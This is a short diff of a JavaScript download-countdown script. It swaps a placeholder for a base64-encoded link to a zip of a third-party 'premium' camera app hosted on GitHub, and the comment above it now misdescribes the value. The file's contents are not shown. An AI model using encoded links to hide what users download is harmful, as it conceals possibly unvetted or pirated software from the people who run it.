@@ -3,7 +3,7 @@ const countdown = document.getElementById("countdown");
 const downloadLink = document.getElementById("downloadLink");
 
 // Base64 encoded version of "yourfile.zip"
-const encryptedLink = "eW91cmZpbGUuemlw";
+const encryptedLink = "aHR0cHM6Ly9naXRodWIuY29tL21haGludG9wL1ByZW1pdW0tYXBwcy9yZWxlYXNlcy9kb3dubG9hZC9CbGFja21hZ2ljYWxwaGEzLjAuMS9CbGFja21hZ2ljLkNhbWVyYV8zLjAuMS4wMDEyLnppcA==";
 
 function decodeBase64(str) {
   return atob(str);
